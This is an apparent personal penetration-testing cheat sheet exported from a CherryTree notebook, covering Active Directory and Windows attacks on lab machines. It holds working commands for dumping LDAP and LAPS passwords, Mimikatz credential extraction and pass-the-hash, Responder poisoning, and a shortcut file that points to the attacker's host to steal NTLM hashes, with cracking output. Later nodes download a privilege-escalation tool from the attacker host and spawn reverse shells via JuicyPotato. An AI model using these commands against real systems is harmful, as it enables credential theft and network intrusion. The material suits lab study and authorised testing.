GhLFXdTTpw4AcCgQYPsfh4bG4tEIiEtLY3y8nIAwsLCADh37hybN29Gq9VafSc8PJzu3bu36BitH5jlcjlvvPEG3bt3b/A7WVlZ5OfnM3r0aLs95Pv378+oUaMsL39//2anRxCEPyeNRotWq6VGo6FGo0Gr1aLRaG2Ws6nWNg8o0pwgc7MtXLiQf/7zn3z//ff8+OOP9OzZk5iYGGJjY+nRo0ezOwCZS16NVRn7+/uTlJREXl6ezWf1S2twvdTo7e1td33mi7e96on63N3dgZbvY/Pyv/fGydzenZGRweLFi+0uYy6dX7lyxeYzX1/fZm8rJycHgP3793P+/Hm7y8jlcrRaLVlZWXTv3p2goCCeeuop1q5dy7Jly3jvvfeIjo6mX79+DBw4sMU1Dg0F5uHDhzf6PaVSyfTp0xk8eHCT20hKSiIuLo4JEyZYbjIFQRDq02g0VFdXW2JFTU0NGo3GZjmb4Gy+8Kanp//BSbQVGxvLt99+y4YNGzh48KBloJOPP/6YoKAgZs2a1axq7erqaoBG28zNn5mXraux54hvxjPG5uBvL/A1xhzoAgICftf2zb85IyODjIyMRpdVqVQ277m6urZ4W+bSenO39dRTTxEVFcXmzZs5evQocXFxxMXF8c477xAZGckLL7xgqf1ozJ49e24oMIPpBm7GjBlNLgdw6NAh1q1bZ1N1LwiCUFdlpanmVKvVAabgbH6vLpvgHBUVxaZNmzh79ixlZWVN9sQFUynL29u72SXbxp5NDg4O5sUXX+TFF18kPT2dEydOsGfPHs6fP8/8+fNZsWJFkyUZc8nSXuA1Mz+b29Kq5Zuhd+/egKmEn5WV1aySoEaj4dy5cwD06tWr2duyt6/Nv3nq1Kk899xzzV7XjXB2dqasrIyVK1c2WLXdkOjoaKKjo9HpdJw7d47jx49bhpKdMWMG3333HX5+fg1+PzExkZdeeumGArPZtWvXrEr8bm5uNqPhGQwGfv75Z/z9/W95Xw1BEP67VFZVYTAaqa4xlZa1Wq2lObkum2Lg4MGDcXR0RKPRWPVkbohareaJJ55gypQpZGZmmlZap2e0Pfaqku0JDw9nypQpfP755/z1r38F4Ouvv27ye+bqbHP1rT3mUmhLOxXdDF26dLGUfs2PYDVlx44dqFQqXFxcrDoe3ci+NgeQ3NzcFqX7RtyMbcnlciIjI5k5cyabN28mKioKlUrV6KAf2dnZ9OzZ09Kx70YCM5ieoZ8/fz7z589n8eLFdkc/++CDD8jOzmbKlCkt+2GCIPzpqFSVlJdXUF5eXvuqQKWybeKUAEaA8spbO7qXIAiCIAjW3F1MTa6tc5BmQRAEQfgTE8FZEARBEFoZEZwFQRAEoZWxtDkLgiAIgtA6SJcsWXK70yAIgiAIQq1p06bx/3DpeHej4kCKAAAAAElFTkSuQmCC</encoded_png>
        </node>
        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1696109791">
          <rich_text scale="h3">Using Ldapsearch</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or 

Without any user:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u have the output make sure u check log file for 

1.  </rich_text>
          <rich_text weight="heavy">Passwords</rich_text>
          <rich_text> via :
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
2.  </rich_text>
          <rich_text weight="heavy">Usernames</rich_text>
          <rich_text> Via:
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_________________________________________________________________


</rich_text>
          <rich_text scale="h2">To check for admin</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -H ldap://10.10.11.152 -D ‘luser@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
          <codebox char_offset="24" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.11.152</codebox>
          <codebox char_offset="50" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://10.10.11.152 | tee ldapSearch.log  </codebox>
          <codebox char_offset="133" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
          <codebox char_offset="157" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep 'sAMAccountName:' ldapSearch.log

or

grep 'userPrincipalName:' ldapsearch/ldapSearch_Guest.log   </codebox>
          <codebox char_offset="249" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.11.152 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd</codebox>
        </node>
        <node name="MIMIKATZ" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688334012" ts_lastsave="1688335156">
          <rich_text underline="single" weight="heavy">Mimikatz Commands:</rich_text>
          <rich_text>
&#13;&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords">logonpasswords</rich_text>
          <rich_text>: </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::logonpasswords</rich_text>
          <rich_text>)&#13;&#13;◇ Extracts passwords in memory
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth">pth</rich_text>
          <rich_text> (pass the hash):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</rich_text>
          <rich_text>&#13;&#13;◇ A fake identity is created and the faske identitt’s NTLM hash is replaced with the real one.
&#13;◇ “ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable)”
&#13;◇ “AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.”
&#13;
&#13;
&#13;• ptt (pass the ticket):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # kerberos::ptt</rich_text>
          <rich_text>&#13;&#13;◇ Enables Kerberos ticket (TGT or TGS) injection into the current session.
&#13;
&#13;
&#13;• tickets:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::tickets /export</rich_text>
          <rich_text>&#13;&#13;◇ Identifies all session Kerberos tickets and lists/exports them.
&#13;◇ sekurlsa pulls the Kerberos data from memory and can access all user session tickets on the computer.
&#13;
&#13;
&#13;• ekeys:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::ekeys</rich_text>
          <rich_text>&#13;&#13;◇ Extract the Kerberos ekeys from memory. Provides theft of a user &#13;account until the password is changed (which may be never for a &#13;Smartcard/PKI user).
&#13;
&#13;
&#13;• dpapi:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::dpapi</rich_text>
          <rich_text>
&#13;• minidump:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::minidump lsass.dmp</rich_text>
          <rich_text>&#13;&#13;◇ Perform a minidump of the LSASS process and extract credential data &#13;from the lsass.dmp. A minidump can be saved off the computer for &#13;credential extraction later, but the major version of Windows must match&#13; (you can’t open the dump file from Windows 2012 on a Windows 2008 &#13;system).
&#13;
&#13;
&#13;• kerberos:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::kerberos</rich_text>
          <rich_text>&#13;&#13;◇ &#13; Extracts the smartcad/PIV PIN from memory (cached in LSASS when using a smartcard).&#13;
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege">debug:</rich_text>
          <rich_text>&#13;mimikatz # privilege::debug&#13;&#13;◇ Sets debug mode for current mimikatz session enabling LSASS access.
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=en&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com&amp;sl=fr&amp;tl=en&amp;u=http://blog.gentilkiwi.com/securite/mscache-v2-dcc2-iteration&amp;usg=ALkJrhjpLNpxdAk-QbYsP-iApIcsLGHdWA">lsadump cache</rich_text>
          <rich_text>: (requires token::elevate to be SYSTEM)&#13;mimikatz # lsadump::cache&#13;&#13;◇ Dumps cached Windows domain credentials from HKEY_LOCAL_MACHINE\SECURITY\Cache (accessible SYSTEM).

</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
&#13;
&#13;
&#13;
</rich_text>
        </node>
        <node name="Responder" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689197133" ts_lastsave="1689283651">
          <rich_text scale="h1">
LLMNR/NBT-NS/mDNS Poisoner


</rich_text>
          <rich_text scale="h2">Basic Usage:</rich_text>
          <rich_text>

Run:

sudo responder -I tun0
or 


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


And then made victim perform actions (send queries via ssrf) to posion
When a client tries to resolve a name not in the DNS, Responder will poison the LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) and spoof SMB Request in order to grab NetNTLMv2 hash.

Reference:
</rich_text>
          <rich_text link="webs https://juggernaut-sec.com/llmnr-poisoning-responder/">https://juggernaut-sec.com/llmnr-poisoning-responder/</rich_text>
          <codebox char_offset="79" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wv</codebox>
          <codebox char_offset="88" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wvfr</codebox>
        </node>
        <node name="Remote Shells for Windows" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689198163" ts_lastsave="1689286554">
          <rich_text>

</rich_text>
          <rich_text link="node 86">psexec - Passthe HAsh</rich_text>
          <rich_text>


</rich_text>
          <rich_text link="node 95">evilwinrm</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1690067048">
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where u make sure the hash is the second part of  the hash:

ex: 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



</rich_text>
          <rich_text scale="h2">Option</rich_text>
          <rich_text>


If u want to run a file on ur local kali linux directly use `-s`  option followed by  `directory location`

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

now if u have PowerView.ps1 on ur local kali/attacker machine u can run it directly on windows system


References:
1. </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/</rich_text>
          <rich_text>
2. </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</rich_text>
          <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -u '&lt;user&gt;' -p &lt;password&gt; -i 10.10.11.152</codebox>
          <codebox char_offset="8" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.11.152 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f8</codebox>
          <codebox char_offset="79" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;hash not to use&gt;:&lt;hash to actually use&gt;</codebox>
          <codebox char_offset="201" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.11.152 -u anirudh -p "SecureHM" -s .</codebox>
        </node>
        <node name="URI File Attack" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690061701" ts_lastsave="1690061750">
          <rich_text>
</rich_text>
          <rich_text scale="h2">URI File Attack</rich_text>
          <rich_text>
&#13;As this is a Windows host, we can use the SMB share access&#13;  to upload a file that the target system will interpret as a Windows &#13; shortcut. In this file, we can specify an icon that points to our Kali &#13; host. This should allow us to capture the user's NTLM hash when it is &#13; accessed.
&#13;We'll create a file named @hax.url with the following contents.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;When a user accesses this file, it will attempt to load &#13; the icon. This will cause a request to our Kali host for a file named &#13; with the user account's username. This request should also contain the &#13; NTLM hash of this account.
&#13;Before uploading the file to the SMB share, let's start responder to listen for the request.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Next, let's upload our file.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Nice, we successfully obtained the NTLM hash for a user named anirudh.&#13; User Password Brute-Force
&#13;Let's save this hash to a file and attempt to crack it using john and the rockyou.txt wordlist.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="370" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat @hax.url &#13;
[InternetShortcut]&#13;
URL=anything&#13;
WorkingDirectory=anything&#13;
IconFile=\\192.168.118.14\%USERNAME%.icon&#13;
IconIndex=1</codebox>
          <codebox char_offset="700" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ sudo responder -I tun0 -v&#13;
...&#13;
[+] Listening for events...&#13;
...</codebox>
          <codebox char_offset="735" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">...&#13;
smb: \&gt; put @hax.url &#13;
putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)&#13;
smb: \&gt; quit&#13;
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$&#13;

&#13;After a little while, responder captures a hash.
&#13;[SMB] NTLMv2-SSP Client   : 192.168.120.116&#13;
[SMB] NTLMv2-SSP Username : VAULT\anirudh&#13;
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1ccodebox>
          <codebox char_offset="936" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat hash.txt &#13;
anirudh::VAULT:9def1316e1c
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt&#13;
Using default input encoding: UTF-8&#13;
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])&#13;
Will run 4 OpenMP threads&#13;
Press 'q' or Ctrl-C to abort, almost any other key for status&#13;
SecureHM         (anirudh)     &#13;
1g 0:00:00:03 DONE (2021-11-19 13:09) 0.2564g/s 2720Kp/s 2720Kc/s 2720KC/s Seifer@14..Schsutar90&#13;
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably&#13;
Session completed. </codebox>
        </node>
        <node name="Powerview" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696729392" ts_lastsave="1696730835">
          <rich_text>USing powerview

Download it:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Start power shell first:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Usage:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

To start PowerView

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

ref: </rich_text>
          <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/">https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/</rich_text>
          <codebox char_offset="30" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</codebox>
          <codebox char_offset="59" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe</codebox>
          <codebox char_offset="70" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Import-Module .\PowerView.ps1</codebox>
          <codebox char_offset="93" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">. .\PowerView.ps1</codebox>
        </node>
        <node name="DACL/DC-Sync" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696734710" ts_lastsave="1697146362">
          <rich_text>check the Forest writeup for priv esc

</rich_text>
          <rich_text link="webs https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough">https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521">https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521</rich_text>
          <rich_text>



PS:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u get the hash use it
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <codebox char_offset="186" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump htb.local/user:pass@10.10.11.152</codebox>
          <codebox char_offset="217" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  EGOTISTICAL-BANK.LOCAL/administrator@10.10.11.152 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e</codebox>
          <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</codebox>
        </node>
        <node name="RPCClient" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698812150" ts_lastsave="1698812302">
          <rich_text>

</rich_text>
          <rich_text link="webs https://www.hackingarticles.in/active-directory-enumeration-rpcclient/">https://www.hackingarticles.in/active-directory-enumeration-rpcclient/</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="75" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">rpcclient 10.10.11.152 -U support</codebox>
        </node>
      </node>
      <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
        <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
        <rich_text>

   ☐  nmap -sn 10.10.11.152
   ☐  nmap -sL 10.10.11.152
   ☐  nbtscan -r 10.10.11.152

</rich_text>
        <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
        <rich_text>

   ☐  nmap  --top-ports 20 --open -iL iplist.txt
   ☐  nmap -sS -A -sV -O -p- 10.10.11.152
   ☐  nmap -sU 10.10.11.152
</rich_text>
      </node>
      <node name="FTP" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687687069" ts_lastsave="1687687497">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Nmap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Download all the files

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Connecting:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 10.10.11.152</codebox>
        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@10.10.11.152'</codebox>
        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 10.10.11.152</codebox>
      </node>
      <node name="PrivEsc" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689966" ts_lastsave="1700426296">
        <node name="Linux" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689975" ts_lastsave="1687689978">
          <rich_text>• use pspy64
• use linpeas
• check sudo -l
• check SUID with the following

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
PS: A binary can be changed to </rich_text>
          <rich_text family="monospace">SUID</rich_text>
          <rich_text> by using </rich_text>
          <rich_text family="monospace">chmod u+s /bin/bash</rich_text>
          <rich_text>

• check do as via:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>

References:
◇ </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</rich_text>
          <rich_text>
◇ </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</rich_text>
          <rich_text>

  </rich_text>
          <codebox char_offset="76" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -u=s -type f 2&gt;/dev/null
or 
find / -perm -4000 2&gt;/dev/null</codebox>
          <codebox char_offset="165" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -type f -name doas.conf 2&gt;/dev/null</codebox>
        </node>
        <node name="Windows" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700426296" ts_lastsave="1707663342">
          <rich_text>
Use winpeas-ng from here:

</rich_text>
          <rich_text link="webs https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</rich_text>
          <rich_text>

or

</rich_text>
          <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</rich_text>
          <rich_text>

_____________________________________________________________________________


Use windows exploit suggester -next generation


1. If u install it wesng via pip make sure u have the updated db.zip in the local directory
2. run this command on windows </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   and copy the output to a file, lets say sysinfo.txt
3. then run the following command in the local folder where the database.zip file is
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
to view exploit only issues

4. Either get the exploit checking elevation of privelege and get the relevant kernel exploit (start with MS )from ExploitDB. Ex

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   

or
 you check the CVE here and view the relevant kernel exploit (u can search it)

</rich_text>
          <rich_text link="webs https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</rich_text>
          <rich_text>


______________________________________________________________________________

Sherlock
</rich_text>
          <rich_text link="webs https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</rich_text>
          <rich_text>   by

1. downloading the ps1 file to Target machine </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
2. running
   a.</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   b. </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

should give u all the info
_________________________________________________________________________________

</rich_text>
          <rich_text scale="h2">Juicy potato 
</rich_text>
          <rich_text>
&#13;1. download juicy potato from here </rich_text>
          <rich_text link="webs https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</rich_text>
          <rich_text>
&#13;2. Transfer it to target via </rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://10.10.14.21/JuicyPotatoNG.exe jp.exe</rich_text>
          <rich_text>
&#13;3. Find ur CLSIDs from here </rich_text>
          <rich_text link="webs https://ohpe.it/juicy-potato/CLSID/">https://ohpe.it/juicy-potato/CLSID/</rich_text>
          <rich_text>
&#13;4. Start a listener </rich_text>
          <rich_text family="monospace">nc -vlp 4343</rich_text>
          <rich_text>
&#13;5. run the following to get a reverse shell:   
   `</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   Ex: `</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>`
   
   or
   
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   

   where `1337` is not the reverse shell port but a port to tell juicy potato to run stuff on ur system. Actual reverse shell with port should eb in ur `privesc.exe` file
&#13;____________________________________
also try

</rich_text>
          <rich_text link="webs https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</rich_text>
          <codebox char_offset="480" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">systeminfo</codebox>
          <codebox char_offset="622" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wes sysinfo.txt --color -e</codebox>
          <encoded_png char_offset="783" justification="left" link=""></encoded_png>
          <codebox char_offset="1111" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="1129" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell-import Sherlock.ps1</codebox>
          <codebox char_offset="1137" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell Find-AllVulns</codebox>
          <codebox char_offset="1608" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\&lt;juicypotatofilename&gt; -p &lt;executable&gt; -l &lt;port&gt; -t * -c &lt;clsid&gt;`</codebox>
          <codebox char_offset="1622" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\jp.exe -p C:\Users\merlin\Desktop\privesc.exe -l 1337 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</codebox>
          <codebox char_offset="1642" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">jp.exe -p rev1.exe -l 1337 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</codebox>
        </node>
      </node>
      <node name="Password-Cracking" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690527" ts_lastsave="1687691201">
        <rich_text scale="h3">Cracking</rich_text>
        <rich_text> AD Hashes from ASRepRoasting

</rich_text>
